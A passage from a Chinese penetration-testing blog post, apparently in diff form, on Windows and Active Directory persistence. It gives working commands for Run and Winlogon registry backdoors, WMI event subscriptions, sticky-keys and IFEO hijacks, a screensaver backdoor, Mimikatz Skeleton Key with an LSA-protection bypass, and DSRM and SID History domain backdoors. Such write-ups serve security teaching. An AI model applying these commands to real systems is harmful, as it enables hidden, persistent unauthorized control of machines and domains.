+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Currentversion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\System32\reverse_tcp.exe"</span><br></pre></td></tr></tbody></table></figure>
+
+<p>当用户重新登录时，目标主机将重新上线</p>
+<h4 id="3-Winlogon-Helper"><a href="#3-Winlogon-Helper" class="headerlink" title="3.Winlogon Helper"></a>3.Winlogon Helper</h4><p><strong>Winlogon</strong>是<strong>Windows</strong>系统的组件，用于处理与用户有关的各种行为，如登录、注销在登录时加载用户配置文件、锁定屏幕等。这些行为由系统注册表管理，注册表中的一些键值定义了在<strong>Windows</strong>登录期间会启动哪些进程。<br>测试人员可以滥用此类注册表键值，使<strong>Winlogon</strong>在用户登录时执行恶意程序，以此建立持久化后门。常见的有以下两个：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 指定用户登录时执行的用户初始化程序，默认为userinit.exe HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\Shell</span><br><span class="line"># 指定Windows身份验证期间执行的程序，默认为explorer.exe HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\Userinit</span><br></pre></td></tr></tbody></table></figure>
+
+<p>执行以下命令：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "C:\Windows\System32\userinit.exe,reverse_tcp.exe" /f</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在<strong>Userinit</strong>键值中添加一个后门程序，该程序将在用户登录时启动。目标主机成功上线。</p>
+<p>注意，在滥用<strong>Userinit</strong>和<strong>Shell</strong>键时需要保留键值中的原有程序，将待启动的后门程序添加到原有程序后面，并以“**,**”进行分隔。并且，后门程序需要被上传至<code>C:\Windows\</code><strong>System32</strong>目录。</p>
+<h3 id="5-Port-Monitors"><a href="#5-Port-Monitors" class="headerlink" title="5.Port Monitors"></a>5.Port Monitors</h3><p>打印后台处理服务（<strong>Print Spooler</strong>）负责管理<strong>Windows</strong>系统的打印作业。与该服务的交互是通过<strong>Print Spooler API</strong>执行的，其中包含<strong>AddMonitor</strong>函数，用于安装<strong>Port Monitors</strong><br>（本地端口监视器），并连接配置、数据和监视器文件。<strong>AddMonitor</strong>函数能够将DLL注入<strong>spoolsv.exe</strong>进程，以实现相应功能，并且通过创建注册表键，测试人员可以在目标系统上进行权限持久化。利用该技术需要拥有管理员级别的权限。</p>
+<ol>
+<li>通过<strong>Metasploit</strong>生成一个64位的恶意<strong>DLL</strong>。</li>
+<li>将生成的DLL上传到目标主机的<code>C:\Windows\System32</code>目录中，并执行以下命令通过编辑注册表安装一个端口监视器。</li>
+</ol>
+<p>通过编辑注册表安装一个端口监视器。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add "HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\TestMonitor" /v</span><br><span class="line">"Driver" /t REG_SZ /d "reverse_tcp.dll"</span><br></pre></td></tr></tbody></table></figure>
+
+<p>当系统重启时，<strong>Print Spooler</strong>服务在启动过程中会读取<strong>Monitors</strong>注册表项的所以子健，并以<strong>SYSTEM</strong>权限加载<strong>Driver</strong>键值所制定的<strong>DLL</strong>文件。目标主机上线。</p>
+<h2 id="事件触发执行"><a href="#事件触发执行" class="headerlink" title="事件触发执行"></a>事件触发执行</h2><p>​    各种操作系统都具有监视和订阅事件的机制，如登录、启动程序或其他用户活动时运行特定的应用程序或代码等，测试人员可以通过滥用这些机制实现持久化。</p>
+<h3 id="利用WMI事件订阅"><a href="#利用WMI事件订阅" class="headerlink" title="利用WMI事件订阅"></a>利用WMI事件订阅</h3><p>前面曾介绍使用<strong>WMI</strong>事件订阅进行横线移动的方法。该方法通过在远程主机上部署永久事件订阅，当指定进程启动时，将执行恶意命令以获取远程主机权限。同样，测试人员可以在已获取权限的主机上部署永久事件订阅，当特定事件触发时，执行特定的后门程序或其他攻击载荷，以建立持久化后门。利用该技术需要拥有管理员级别的权限。</p>
+<h4 id="1-手动利用"><a href="#1-手动利用" class="headerlink" title="1.手动利用"></a>1.手动利用</h4><p>通常情况下，<strong>WMI</strong>事件订阅的需要分别创建<strong>事件过滤器（Event Filter）</strong>和<strong>事件消费者（Event Consumer）</strong>，并把二者关联起来，以将事件发生和触发执行绑定一起。<br>下面通过<strong>PowerShell</strong>部署一个事件订阅，可以在每次系统启动后的5分钟内执行后门程序<strong>reverse_tcp.exe</strong>，相关命令如下。</p>
+ <figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ========================创建一个名为TestFiltr的事件过滤器========================</span></span><br><span class="line"><span class="variable">$EventFilterArgs</span> = <span class="selector-tag">@</span>{</span><br><span class="line">	EventNamespace <span class="string">'root/cimv2'</span></span><br><span class="line">	Name <span class="string">"TestFilter"</span></span><br><span class="line">	Query = <span class="string">"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfoS_System'AND TargetInstance.SystemUpTime &gt;240 AND TargetInstance.SystemUpTime &lt; 325"</span></span><br><span class="line">	QueryLanguage =<span class="string">'WQL'</span></span><br><span class="line">}</span><br><span class="line"><span class="variable">$EventFilter</span> = <span class="built_in">Set-WmiInstance</span> <span class="literal">-Namespace</span> root\subscription <span class="literal">-Class</span> __EventFilter<span class="literal">-Arguments</span> <span class="variable">$EventFilterArgs</span></span><br><span class="line"><span class="comment"># =========创建一个名为TestConsumer的事件消费者，在指定事件发生时执行后门程序==========</span></span><br><span class="line"><span class="variable">$CommandLineEventConsumerArgs</span> =<span class="selector-tag">@</span>{</span><br><span class="line">	Name = <span class="string">"TestConsumer"</span></span><br><span class="line">	CommandLineTemplate = <span class="string">"cmd.exe /k C：\Windows\System32\reverse_tcp.exe"</span></span><br><span class="line">}</span><br><span class="line"><span class="variable">$EventConsumer</span> = <span class="built_in">Set-WmiInstance</span> <span class="literal">-Namespace</span> root\subscription <span class="literal">-Class</span> CommandLineEventConsumer <span class="literal">-Arguments</span> <span class="variable">$CommandLineEventConsumerArgs</span></span><br><span class="line"><span class="comment"># ==========================将事件过滤器和事件消费者绑定在一起===========================</span></span><br><span class="line"><span class="variable">$FilterConsumerBindingArgs</span> = <span class="selector-tag">@</span>{</span><br><span class="line">	<span class="keyword">Filter</span> = <span class="variable">$EventFilter</span> </span><br><span class="line">	Consumer = <span class="variable">$EventConsumer</span></span><br><span class="line">}</span><br><span class="line"><span class="variable">$FilterConsumerBinding</span> = <span class="built_in">Set-WmiInstance</span> <span class="literal">-Namespace</span> root\subscription <span class="literal">-Class</span></span><br><span class="line">__FilterToConsumerBinding <span class="literal">-Arguments</span> <span class="variable">$FilterConsumerBindingArgs</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>执行上述命令后，目标主机将在启动后的5分钟内重新上线</p>
+<h4 id="2-相关辅助工具"><a href="#2-相关辅助工具" class="headerlink" title="2.相关辅助工具"></a>2.相关辅助工具</h4><p>前面讲解<strong>WMI</strong>事件订阅的横向移动时，曾通过<strong>Sharp-WMIEvent</strong>在远程主机上执行系统命令，该工具同样包含权限持久化功能。<br>在目标主机上执行以下命令，运行<strong>Sharp-WMIEvent</strong>。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Sharp-WMIEvent.ps1</span><br><span class="line">Sharp-WMIEvent -Trigger UserLogon -Command "cmd.exe /c C:\Windows\System32\reverse_tcp.exe"</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这将在当前主机上部署一个随机命名的永久事件订阅，每当用户登录时将执行恶意程序目标主机将重新上线</p>
+<img src="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/image-20240113163537938.png" class="" title="image-20240113163537938">
+
+<img src="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/image-20240113164114186.png" alt="image-20240113164114186" style="zoom:67%;">
+
+<p>注意，首次执行<strong>PowerShell</strong>脚本会报错，是由于 <strong>PowerShell</strong> 的执行策略（<strong>Execution Policy</strong>）不允许运行不安全的脚本</p>
+<img src="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/image-20240113164755394.png" class="" title="image-20240113164755394">
+
+<p>解决方法是以管理员身份运行<strong>PowerShell</strong>，并执行：</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> RemoteSigned</span><br></pre></td></tr></tbody></table></figure>
+
+<p>此外，<strong>Metasploit</strong>框架内置了一个通过<strong>WMI</strong>事件订阅在目标系统上实现持久性的模块，即<code>exploit/windows/local/wmi persistence</code>，支持不同的选项，可用于特定事件触发时在系统上执行任意的攻击载荷</p>
+<h3 id="利用系统辅助功能"><a href="#利用系统辅助功能" class="headerlink" title="利用系统辅助功能"></a>利用系统辅助功能</h3><p><strong>Windows</strong>系统包含了许多供用户通过组合键启动的辅助功能，测试人员可以修改这些程序的启动方式，以获取目标主机的命令行或运行指定的后门攻击载荷，不需登录系统即可获取目标主机权限。常见的辅助功能程序都位于<code>C:Windows System32</code>目录下。</p>
+<img src="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/image-20240113165608637.png" class="" title="image-20240113165608637">
+
+<p>最常见利用的辅助功能程序是<strong>sethc.exe</strong>，通常被称为“粘滞键”。当连续5次按下Shift键时，该程序将启动<br>测试人员通常在目标系统上将<strong>cmd.exe</strong>伪装成<strong>sethc.exe</strong>，然后在远程桌面登录屏幕中连按5次Sift键，即可获取一个命令行窗口，实现未授权访问。该方法需要拥有管理员权限。</p>
+<h4 id="1-手动利用-1"><a href="#1-手动利用-1" class="headerlink" title="1.手动利用"></a>1.手动利用</h4><p>在高版本的<strong>Windows</strong>中，<code>C:Windows\System32</code>目录下的文件受到系统保护，只有<strong>TrustedInstaller</strong>权限的用户才对其中的文件拥有修改和写入权限。所以，在替换<strong>sethc.exe</strong>程序前需要先通过令牌窃取提升至<strong>TrustedInstaller</strong>权限。相关提权方法见第4章的“令牌窃取”部分，这里不再赘述。</p>
+<p>获取<strong>TrustedInstaller</strong>权限后，执行以下命令：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd C:\Windows\System32</span><br><span class="line">move sethc.exe sethc.exe.bak            # 将sethc.exe重命名</span><br><span class="line">copy cmd.exe sethc.exe                  # 将一个cmd.exe副本伪装成sethc.exe</span><br></pre></td></tr></tbody></table></figure>
+
+<p>此时，在目标主机的远程桌面登录屏幕中连按5次Shift键，即可获取一个命令行窗口，并且为SYSTEM权限，如图6-2-8所示。</p>
+<h4 id="2-RDP劫持"><a href="#2-RDP劫持" class="headerlink" title="2.RDP劫持"></a>2.RDP劫持</h4><p>通过粘滞键等系统辅助功能创建的后门以<strong>SYSTEM</strong>权限运行，测试人员可以在获取的命令行中执行<strong>RDP</strong>劫持，不需任何用户凭据即可登入目标系统桌面，关于<strong>RDP</strong>劫持的方法请读者参考前面讲解内网横向移动的章节。</p>
+<h3 id="IFEO注入"><a href="#IFEO注入" class="headerlink" title="IFEO注入"></a>IFEO注入</h3><p><strong>IFEO(Image File Execution Options)<strong>是</strong>Windows</strong>系统的一个注册表项，路径为<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</code>。在<strong>WindowsNT</strong>系统中，<strong>IFEO</strong>原本是为一些在默认系统环境中运行时可能引发错误的程序执行体提供特殊的环境设定。<strong>IFEO</strong>使开发人员能够将调试器附加到应用程序。当进程创建时，应用程序的<strong>IFEO</strong>中设置的调试器将附加到应用程序的名称前，从而有效地在调试器下启动新讲程</p>
+<h4 id="1-Dubugger"><a href="#1-Dubugger" class="headerlink" title="1.Dubugger"></a>1.Dubugger</h4><p>当用户启动计算机的程序后，系统会在注册表的<strong>IFEO</strong>中查询所有的程序子键，如果存在与该程序名称相同的子健，就读取对应子键的“<strong>Dubugger</strong>”键值。如果该键值未被设置，就默认不做处理，否则直接用该键值所指定的程序路径来代替原始的程序。<br>通过编辑“<strong>Dubugger</strong>”的值，测试人员可以通过修改注册表的方式创建粘滞键后门，而不需获取<strong>TrustedInstaller</strong>权限。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add "HKLM\SOFTWARE\Microsoft\windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C\Windows\System32\cmd.exe"</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在目标主机上执行以下命令，向<strong>Image File Execution Options</strong>注册表项中添加映像劫持子键，并将“<strong>Dubugger</strong>”的值设置为要执行的程序即可。</p>
+<p>连按5次<strong>shift</strong>成功弹出命令行窗口。</p>
+<h4 id="GlobalFlag"><a href="#GlobalFlag" class="headerlink" title="GlobalFlag"></a>GlobalFlag</h4><p><strong>IFEO</strong>还可以在指定程序静默退出时启动任意监控程序，需要通过设置以下3个注册表来实现。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 启用对记事本进程的静默退出监视</span><br><span class="line">reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512</span><br><span class="line"># 启用Windows错误报告进程WerFault.exe，它将成为reverse_tcp.exe的父进程</span><br><span class="line">reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\ </span><br><span class="line">notepad.exe" /v ReportingMode /t REG_DWORD /d 1</span><br><span class="line"># 将监视器进程设为reverse_tcp.exe</span><br><span class="line">reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\ </span><br><span class="line">notepad.exe" /v MonitorProcess /d "C:\Windows\System32\reverse_tcp.exe"</span><br></pre></td></tr></tbody></table></figure>
+
+<p>当用户打开记事本**(notepad.exe)<strong>时，程序正常启动。当用户关闭记事本或相关进程被杀死后时，将在</strong>WerFault.exe<strong>进程中创建子进程以运行后门程序</strong>reverse_tcp.exe**，如图</p>
+<img src="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/image-20240124214856419.png" alt="image-20240124214856419" style="zoom:120%;">
+
+
+
+<h3 id="利用屏幕保护程序"><a href="#利用屏幕保护程序" class="headerlink" title="利用屏幕保护程序"></a>利用屏幕保护程序</h3><p>屏幕保护是<strong>Windows</strong>系统的一项功能，可以在用户一段时间不活动后播放屏幕消息或图形动画。屏幕保护程序由具有**.scr**文件扩展名的可执行文件组成。系统注册表项<code>HKEY_CURRENT_USER\Control Panel\Desktop</code>下存储了用来设置屏幕保护程序的键值，如表</p>
+<img src="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/image-20240124215042439.png" class="" title="image-20240124215042439">
+
+<p>测试人员可以通过编辑注册表，修改屏幕保护程序的执行路径（即<strong>scrnsave.exe</strong>键的值），当触发屏幕保护时执行自定义的后门程序，以此实现持久化，相关命令如下：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 将触发屏幕保护时执行的程序设为自定义的恶意程序，这里的程序以.scr或.exe为扩展名皆可</span><br><span class="line">reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d</span><br><span class="line">"C:\Users\Marcus\reverse_tcp.scr"</span><br><span class="line"># 启用屏幕保护</span><br><span class="line">reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1</span><br><span class="line"> #设置不需要密码解锁</span><br><span class="line"> reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d "0"</span><br><span class="line"># 将用户不活动的超时设为60秒</span><br><span class="line">reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveTimeOut /t REG_SZ /d "60"</span><br></pre></td></tr></tbody></table></figure>
+
+<p>利用该技术不需管理员权限，以标准用户权限即可利用。<br>用户一段时间不活动后，屏幕保护程序将触发恶意程序执行，目标主机重新上线</p>
+<p>注意，默认情况下，除<strong>ScreenSaveActive</strong>的值为1外，其余三个键都不存在，所以需要手动创建。并且，触发的恶意程序只能在当前用户的上下文中运行。</p>
+<h3 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h3><p><strong>DLL</strong>劫持是指通过将同名的恶意<strong>DLL</strong>文件放在合法<strong>DLL</strong>文件所在路径前的搜索位置，当应用程序搜索<strong>DLL</strong>时，会以恶意<strong>DLL</strong>代替合法的<strong>DLL</strong>来加载。在权限提升章节中曾通过<strong>DLL</strong>劫持配合系统可信任目录的方法绕过<strong>UAC</strong>保护。本节通过劫持应用程序或服务所加载的<strong>DLL</strong>文件，在目标主机上建立持久化后门。该方法需要拥有管理员权限。</p>
+<h5 id="1-劫持应用程序"><a href="#1-劫持应用程序" class="headerlink" title="1.劫持应用程序"></a>1.劫持应用程序</h5><h5 id="2-劫持系统服务"><a href="#2-劫持系统服务" class="headerlink" title="2.劫持系统服务"></a>2.劫持系统服务</h5><h2 id="常见域后门技术"><a href="#常见域后门技术" class="headerlink" title="常见域后门技术"></a>常见域后门技术</h2><p>当获取域控制器的权限后，为了防止对域控制器权限的丢失，测试人员需要使用一些特定的持久化技术来维持已获取到的域权限。下面将对常见的域后门技术进行介绍。</p>
+<h3 id="创建-Skeleton-Key-域后门"><a href="#创建-Skeleton-Key-域后门" class="headerlink" title="创建 Skeleton Key 域后门"></a>创建 Skeleton Key 域后门</h3><p><strong>Skeleton Key</strong>即“万能钥匙”。通过在域控制器上安装<strong>Skeleton Key</strong>，所有域用户账户都可以使用一个相同的密码进行认证，同时原有密码仍然有效。该技术通过注入<strong>lsass.exe</strong>进程实现，创建的<strong>Skeleton Key</strong>仅保留在内存中，如果域控重启，<strong>Skeleton Key</strong>就会失效。利用该技术需要拥有域管理员级别的权限。</p>
+<h5 id="1-常规利用"><a href="#1-常规利用" class="headerlink" title="1.常规利用"></a>1.常规利用</h5><p>将<strong>mimikatz</strong>上传到域控制器。执行以下命令：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe "privilege::debug" "misc::skeleton" exit</span><br></pre></td></tr></tbody></table></figure>
+
+<p>将创建<strong>Skeleton Key</strong>域后门。</p>
+<img src="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/image-20240303190739637.png" alt="image-20240303190739637">
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop -d bam.local -u Administrator -p mimikatz 192.168.111.162</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/image-20240303193350597.png" alt="image-20240303193350597" style="zoom: 67%;">
+
+<p>即可连接成功。</p>
+<p>这里注意远程桌面默认是不开启的，需要在<code>控制面板--&gt;系统安全--&gt;系统--&gt;远程</code>设置中开启，并且将标注的选项取消勾选。</p>
+<img src="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/image-20240303193307047.png" alt="image-20240303193307047" style="zoom: 80%;">
+
+
+
+<h5 id="2-缓解措施"><a href="#2-缓解措施" class="headerlink" title="2.缓解措施"></a>2.缓解措施</h5><p>微软在2014年3月添加了<strong>LSA（Local Security Authority，本地安全机构）</strong>保护策略，用来防止对<strong>lsass.exe</strong>进程的内存读取和代码注入。通过执行以下命令，可以开启或关闭<strong>LSA</strong>保护。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 开启LSA保护策略</span><br><span class="line">reg add "HKLM\SYSTEM\CurrentControlset\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f</span><br><span class="line"># 关闭LSA保护策略</span><br><span class="line">reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL</span><br></pre></td></tr></tbody></table></figure>
+
+<p>重启系统后，<strong>Mimikatz</strong>的相关操作都会失败。此时即使已经获取了<strong>Debug</strong>权限也无法读取用户哈希值，更无法安装<strong>Skeleton Key</strong></p>
+<p>不过，<strong>Mimikatz</strong>早在2013年10月就已支持绕过<strong>LSA</strong>保护。该功能需要<strong>Mimikatz</strong>项目中的<strong>mimidrv.sys</strong>驱动文件，相应的<strong>Skeleton Key</strong>安装命令也变为了如下。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug </span><br><span class="line">mimikatz # !+</span><br><span class="line">mimikatz # !processprotect /process:lsass.exe /remove</span><br><span class="line">mimikatz # misc::skeleton</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h3 id="创建DSRM域后门"><a href="#创建DSRM域后门" class="headerlink" title="创建DSRM域后门"></a>创建DSRM域后门</h3><p><strong>DSRM（Directory Services Restore Mode，目录服务还原模式）</strong>是域控制器的安全模式启动选项，用于使服务器脱机，以进行紧急维护。在初期安装<strong>Windows</strong>域服务时，安装向导会提示用户设置<strong>DSRM</strong>的管理员密码。有了该密码后，网络管理员可以在后期域控发生问题时修复、还原或重建活动目录数据库。<br>在域控制器上，<strong>DSRM</strong>账户实际上就是本地管理员账户（<strong>Administrator</strong>），并且该账户的密码在创建后几乎很少使用。通过在域控上运行<strong>NTDSUtil</strong>，可以为<strong>DSRM</strong>账户修改密码，相关步骤如下：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 进入ntdsutil</span><br><span class="line">ntdsutil</span><br><span class="line"># 进入设置DSRM账户密码设置模式</span><br><span class="line">set dsrm password</span><br><span class="line"># 在当前域控制器上恢复DSRM密码</span><br><span class="line">reset password on server null</span><br><span class="line"># 输入新密码</span><br><span class="line">&lt;password&gt;</span><br><span class="line"># 退出DSRM密码设置模式</span><br><span class="line">q</span><br><span class="line"># 退出ntdsutill</span><br><span class="line">q</span><br></pre></td></tr></tbody></table></figure>
+
+<p>测试人员可以通过修改<strong>DSRM</strong>账户的密码，以维持对域控制器权限。该技术适用于<strong>Windows Server2008</strong>及以后版本的服务器，并需要拥有域管理员级别的权限。</p>
+<p>下面对相关利用过程进行简单演示：</p>
+<ol>
+<li><p>执行以下命令：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit</span><br></pre></td></tr></tbody></table></figure>
+
+<p>通过<strong>Mimikatz</strong>读取域控的<strong>SAM</strong>文件，获取<strong>DSRM</strong>账户的哈希值</p>
+</li>
+<li><p>修改<strong>DSRM</strong>账户的登录模式，以允许该账户的远程登录。可以通过编辑注册表的<strong>DsrmAdminLogonBehavior</strong>键值来实现，可选用的登录模式有以下3种。<br>0：默认值，只有当域控制器重启并进入<strong>DSRM</strong>模式时，才可以使用<strong>DSRM</strong>管理员账号。</p>
+<p>1：只有当本地<strong>AD</strong>、<strong>DS</strong>服务停止时，才可以使用<strong>DSRM</strong>管理员账号登录域控制器。<br>2：在任何情况下，都可以使用DSRM管理员账号登录域控制器。</p>
+<p>执行以下命令：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f</span><br></pre></td></tr></tbody></table></figure>
+
+<p>将<strong>DSRM</strong>的登录模式改为”<strong>2</strong>“，允许<strong>DSRM</strong>账户在任何情况下都可以登录域控制器。</p>
+</li>
+<li><p>测试人员便可以通过<strong>DSRM</strong>账户对域控制进行控制了。使用<strong>DSRM</strong>账户对域控执行哈希传递攻击并成功获取域控权限。</p>
+</li>
+</ol>
+<h3 id="SID-History的利用"><a href="#SID-History的利用" class="headerlink" title="SID History的利用"></a>SID History的利用</h3><h4 id="1-SID-SID-History"><a href="#1-SID-SID-History" class="headerlink" title="1.SID &amp; SID History"></a>1.SID &amp; SID History</h4><p>在<strong>Windows</strong>系统中，<strong>SID(Security Identifiers)<strong>是指安全标识符，是用户、用户组或其他安全主体的唯一、不可变标识符。<br>Windows根据</strong>ACL</strong>（访问控制列表）授予或拒绝对资源的访问和特权，<strong>ACL</strong>使用<strong>SID</strong>来唯一标识用户及其组成员身份。当用户登录到计算机时，会生成一个访问令牌，其中包含用户和组<strong>SID</strong>和用户权限级别。当用户请求访问资源时，将根据<strong>ACL</strong>检查访问令牌以允许或拒绝对特定对象的特定操作。<br>如果将账户删除，然后使用相同的名字创建另一个账户，那么新账户不会具有前一个账户的特权或访问权限，这是因为两个账户的<strong>SID</strong>不同。<br><strong>SID History</strong>是一个支持域迁移方案的属性，使得一个账户的访问权限可以有效地克隆到另一个账户，这在域迁移过程中非常有用。例如，当<strong>Domain A</strong>中的用户迁移到<strong>Domain B</strong>时，会在<strong>Domain B</strong>中创建一个新的用户账户，并将<strong>Domain A</strong>用户的<strong>SID</strong>添加到<strong>Domain B</strong>的用户账户的<strong>SID History</strong>属性中。这就确保了<strong>Domain B</strong>用户仍然拥有访问<strong>Domain A</strong>中资源的权限。</p>
+<h4 id="2-利用方法"><a href="#2-利用方法" class="headerlink" title="2.利用方法"></a>2.利用方法</h4><p>在实战中，测试人员可以将域管理员用户的<strong>SID</strong>添加到其他域用户的<strong>SID History</strong>属性中，以此建立一个隐蔽的域后门。利用该技术需要拥有域管理员级别的权限。<br>下面在域控制器上创建用户<strong>Mount</strong>进行演示。</p>
+<ol>
+<li><p>向域控制器上传<strong>Mimikatz</strong>，并执行以下命令：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># Mimikatz &gt; 2.1.0</span><br><span class="line">mimikatz.exe "privilege::debug" "sid::patch" "sid::add /sam:Mount /new:Administrator" exit # Mimikatz &lt; 2.1.0</span><br><span class="line">mimikatz.exe "privilege::debug" "misc:addsid Mount ADSAdministrator" exit</span><br></pre></td></tr></tbody></table></figure>
+
+<p>将域管理员<strong>Administrator</strong>的<strong>SID</strong>添加到域用户<strong>Mount</strong>的<strong>SID History</strong>属性中，如图:</p>
+<img src="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/image-20240304205039004.png" alt="image-20240304205039004">
+</li>
